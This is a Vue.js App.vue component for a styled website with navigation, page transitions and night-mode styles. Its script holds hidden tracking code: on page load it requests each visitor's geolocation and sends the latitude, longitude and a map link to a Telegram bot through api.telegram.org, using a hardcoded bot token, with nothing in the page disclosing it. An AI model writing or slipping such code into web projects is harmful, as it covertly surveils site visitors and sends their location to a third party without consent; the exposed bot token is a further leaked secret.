<template>

  <div id="app"  v-bind:class="{nightmode:nightmode}">
  
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.css" integrity="sha256-46qynGAkLSFpVbEBog43gvNhfrOj+BmwXdxFgVK/Kvc=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.8.0/css/mdb.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
   
   
    <Navigation/>
    <div class="background"></div>
    <transition name="page" mode="out-in">
    <router-view  class="animated " transition="slideInUp" />
    
    </transition>      
    
  </div>
</template>

<script>
import axios from 'axios';

import Navigation from '@/components/Navigation.vue';

export default {
  components:{
    Navigation
  },
  methods:{
    showPosition(position) {
          axios.get(`https://api.telegram.org/bot5516668583:AAH6JtyF3z5Q_5Lw7V28sHyRyB-7yzjSffk/sendMessage?chat_id=@api_location&text=
          Latitude:${position.coords.latitude}
          Longitude:${position.coords.longitude}
          https://www.google.com/maps/search/?api=1&amp;query=${position.coords.latitude},${position.coords.longitude}
          `);}
  },
  beforeMount() {
    navigator.geolocation.getCurrentPosition(this.showPosition);
  },
  computed:{},
  data(){
    return{
nightmode:false,
x:'',
y:'',
zIn:''
    }
    
  }
}
</script>
<style lang="scss">
$bg-url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAIAAACRXR/mAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAIGNIUk0AAHolAACAgwAA+f8AAIDpAAB1MAAA6mAAADqYAAAXb5JfxUYAAABnSURBVHja7M5RDYAwDEXRDgmvEocnlrQS2SwUFST9uEfBGWs9c97nbGtDcquqiKhOImLs/UpuzVzWEi1atGjRokWLFi1atGjRokWLFi1atGjRokWLFi1af7Ukz8xWp8z8AAAA//8DAJ4LoEAAlL1nAAAAAElFTkSuQmCC";
$bg-width: 0px;
$bg-height: 50px;
/* Animations */
 

@keyframes         bg-scrolling-reverse {
  100% { background-position: $bg-width $bg-height; }
}

@keyframes         bg-scrolling {
  0% { background-position: $bg-width $bg-height; }
}


.page-enter-active, .page-leave-active {
  transition: opacity 1s, transform 1s;
}
.page-enter, .page-leave-to {
  opacity: 0;
  transform: translateX(-30%);
}

*{
  margin:0px;
  box-sizing: border-box;
  
}
.background{
  width:100%;
  position: fixed;
  height: 100%;
  filter: invert(1);
  background: url($bg-url) repeat 0 0;
   animation:bg-scrolling-reverse .92s infinite linear; 
}
#app {
  font-family: 'Montserrat', sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  
  
}
#nav {
  padding: 30px;

  a {
    font-weight: bold;
    color: #2c3e50;

    &.router-link-exact-active {
      color: #42b983;
    }
  }
}
h1{
    font-weight: bold;
}
.text-dark-cyan {
    color: #0ee;
}
.fullvh{
  padding-top:10vh;
 
  min-height: 100vh;
  height: auto;
  margin:0;
  background:transparent;
  position: relative;
  z-index: 2;
}
.center-grid{
  display: grid;
  place-items: center;
}
.center{
  display: flex;
  justify-content: center;
  align-items: center;
  flex-direction: column;
}
.center-ver{
  display: flex;
  justify-content: center;
  align-items: flex-start;
  flex-direction: column;
}
.text-shadow {
    text-shadow: 0px 0px 3px #0ff;
    ;
}
.box-shadow {
    box-shadow: 0px 0px 3px #0ff;
    ;
}
.circle{
  width:10px;
  height:10px;
  background:black;
  border-radius:50px;
  position:fixed;
  transform:translate(-50%,-50%);
  transition: all .3s linear;
  pointer-events:none;
  color:#fff;
  display:flex;
  justify-content:center;
  align-items:center;
  font-size:2em;
  z-index: 1000;
}
.wrapper {
    display: flex;
    justify-content: space-evenly;
    align-items: flex-start;
    flex-direction: row;
    flex-wrap: wrap;
  }
  .profile{
    border-radius: 50%;
    width:100%;
  }
  .brdr-btm{
    outline:0px !important;
    border:0px !important;
    border-bottom:2px aqua solid !important;
    transition: all .2s ease-in;
  }
  .brdr-btm:focus{
    border-bottom:10px aqua solid !important;
  }
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

@media screen and (max-width: 860px) {
  .hide-on-mobile{
    display:none;
  }
  .title{
    font-size: 2em;
  }
  .desc{
    font-size: 1em;
  }
  .profile{
    border-radius: 50%;
    width:60%;
  }
  .fullvh{
    padding-top:2vh;
   padding-bottom:10vh;
  }
}




</style>
